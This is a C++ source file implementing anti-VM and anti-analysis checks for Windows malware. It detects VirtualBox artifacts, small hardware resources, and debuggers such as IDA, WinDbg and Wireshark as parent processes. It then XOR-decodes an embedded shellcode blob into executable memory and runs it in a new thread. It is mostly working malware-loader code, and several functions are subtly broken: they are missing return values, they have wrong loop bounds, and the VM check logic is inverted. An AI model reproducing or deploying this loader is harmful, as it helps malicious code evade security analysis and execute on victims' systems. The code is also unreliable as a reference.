// anti-vm-implementation.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <SetupAPI.h>
#pragma comment (lib, "Setupapi.lib")


#include <winternl.h>
#pragma comment(lib, "ntdll")



#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif


#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#include <tlhelp32.h>

#include <string.h>


#define TH32CS_SNAPPROCESS  0x00000002
#define IP_LOCALHOST    0x0100007F
#define UNICODE



DWORD GetParentPID(DWORD pid)
{
	DWORD ppid = 0;
	PROCESSENTRY32W processEntry = { 0 };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32FirstW(hSnapshot, &processEntry))
	{
		do
		{
			if (processEntry.th32ProcessID == pid)
			{
				ppid = processEntry.th32ParentProcessID;
				break;
			}
		} while (Process32NextW(hSnapshot, &processEntry));
	}
	CloseHandle(hSnapshot);
	return ppid;
}

bool check_parent_procecss_name() {

	const wchar_t* known_names[] = {
		L"IDA.exe",
		L"WINDBG.EXE",
		L"WIRESHARk.exe"
	};
	DWORD parentPid = GetParentPID(GetCurrentProcessId());
	WCHAR parentName[MAX_PATH + 1];
	DWORD dwParentName = MAX_PATH;
	HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
	QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName); // another way to get process name is to use 'Toolhelp32Snapshot'
	CharUpperW(parentName);
	for (int i = 0; i < sizeof(known_names); i++)
	{
		if (wcsstr(parentName, known_names[i])) return false;

	}
}



bool check_resources() {
	// check CPU
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	if (numberOfProcessors < 2) return false;

	// check RAM
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 2048) return false;

	// check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 100) return false;
}
bool check_device_hdd_device_name() {
	HDEVINFO hDeviceInfo = SetupDiGetClassDevs(NULL, 0, 0, DIGCF_PRESENT);
	SP_DEVINFO_DATA deviceInfoData;
	deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
	SetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData);
	DWORD propertyBufferSize;
	SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &propertyBufferSize);
	PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);
	SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);
	CharUpperW(HDDName);
	if (wcsstr(HDDName, L"VBOX")) return false;

}

bool check_if_pipes_exist() {
	OBJECT_ATTRIBUTES objectAttributes;
	UNICODE_STRING uDeviceName;
	RtlSecureZeroMemory(&uDeviceName, sizeof(uDeviceName));
	RtlInitUnicodeString(&uDeviceName, L"\\Device\\VBoxGuest"); // or pipe: L"\\??\\pipe\\VBoxTrayIPC-<username>"
	InitializeObjectAttributes(&objectAttributes, &uDeviceName, OBJ_CASE_INSENSITIVE, 0, NULL);
	HANDLE hDevice = NULL;
	IO_STATUS_BLOCK ioStatusBlock;
	NTSTATUS status = NtCreateFile(&hDevice, GENERIC_READ, &objectAttributes, &ioStatusBlock, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);
	if (NT_SUCCESS(status)) return false;

}
bool check_if_vm_by_mac_addr() {
	DWORD adaptersListSize = 0;
	GetAdaptersAddresses(AF_UNSPEC, 0, 0, 0, &adaptersListSize);
	IP_ADAPTER_ADDRESSES* pAdaptersAddresses = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, adaptersListSize);
	if (pAdaptersAddresses)
	{
		GetAdaptersAddresses(AF_UNSPEC, 0, 0, pAdaptersAddresses, &adaptersListSize);
		char mac[6] = { 0 };
		while (pAdaptersAddresses)
		{
			if (pAdaptersAddresses->PhysicalAddressLength == 6)
			{
				memcpy(mac, pAdaptersAddresses->PhysicalAddress, 6);
				if (!memcmp({ "\x08\x00\x27" }, mac, 3)) return false;
			}
			pAdaptersAddresses = pAdaptersAddresses->Next;
		}
	}

}


bool check_for_virtualbox_artifacts() {
	// check files
	WIN32_FIND_DATAW findFileData;
	if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;

	// check registry key
	HKEY hkResult;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxSF", 0, KEY_QUERY_VALUE, &hkResult) == ERROR_SUCCESS) return false;

}
bool check_parent_dir_executable_name() {
	wchar_t currentProcessPath[MAX_PATH + 1];
	GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);
	CharUpperW(currentProcessPath);
	if (!wcsstr(currentProcessPath, L"C:\\USERS\\PUBLIC\\")) return false;
	if (!wcsstr(currentProcessPath, L"MALWARE.EXE")) return false;
}






bool is_vm() {
	if (!check_resources()) return false;
	if (!check_device_hdd_device_name()) return false;
	if (!check_if_pipes_exist()) return false;
	if (!check_if_vm_by_mac_addr()) return false;
	if (!check_parent_dir_executable_name()) return false;
	if (!check_parent_procecss_name()) return false;
}
int main()
{

	bool status = check_device_hdd_device_name();

	
	if (is_vm()) {
		exit(0);
	}
	unsigned char shellcode[] = "\xa8\xcf\x76\xa8\xcf\x2a\x2a\x4b\x46\x5b\x46\xc\x3\x2a\x2a\x4b\x40\x4e\x47\xd\x3\x2a\x2a\xae\x66\xdb\x73\x9b\x2a\x2a\xe4\xb0\xe1\x54\x3\x2a\x2a\xdc\xf3";
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (shellcode_exec == NULL) {
		exit(-1); // not enough mem
	}
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;

	int key = 35;
	for (int i = 0; i < sizeof(shellcode_exec); i++)
	{
		((char*)shellcode_exec)[i] = ((char*)shellcode_exec)[i] ^ 35;
	}
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
	return 0;
}